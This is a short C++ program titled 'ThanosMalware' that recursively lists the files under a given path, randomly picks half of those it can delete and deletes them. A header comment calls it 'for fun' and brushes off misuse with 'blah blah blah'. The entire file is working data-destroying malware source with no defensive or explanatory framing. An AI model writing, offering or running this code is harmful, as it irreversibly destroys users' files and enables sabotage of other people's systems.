/* ThanosMalware

Deletes half of the files on your computer. This should obviously only be used for fun and not malicious purposes, blah blah blah.
*/
#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <vector>
#include <random>



int main(int argc, char** argv)
{
	HANDLE hTemp;
	LPVOID path;
	BOOL bSuccess;

	std::vector<const wchar_t*> vDeleteableFiles;
	std::vector<const wchar_t*> vSnappedFiles;
	if (argc != 2)
	{
		std::cout << "Usage: " << argv[0] << " <StartingPath>" << std::endl;
		return 1;
	}

	// Get all files in that directory
	for (std::filesystem::directory_entry dirEntry : std::filesystem::recursive_directory_iterator(argv[1]))
	{
		path = VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!dirEntry.is_regular_file())
			continue;

		wcscpy_s((wchar_t*)path, wcslen(std::filesystem::absolute(dirEntry).wstring().c_str())+1, (wchar_t*)std::filesystem::absolute(dirEntry).wstring().c_str());

		hTemp = CreateFileW(
			(wchar_t*)path,
			DELETE,
			NULL,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		if (hTemp != INVALID_HANDLE_VALUE) {
			vDeleteableFiles.push_back((wchar_t*)path);
			CloseHandle(hTemp);
		}
	}

	// SNAP
	std::sample(
		vDeleteableFiles.begin(),
		vDeleteableFiles.end(),
		std::back_inserter(vSnappedFiles),
		vDeleteableFiles.size() / (size_t)2,
		std::mt19937{ std::random_device{}()}
	);
	
	for (const wchar_t* path: vSnappedFiles)
	{
		std::wcout << L"Snapping " << path << std::endl;
		bSuccess = DeleteFileW(path);
	}

	return 0;
}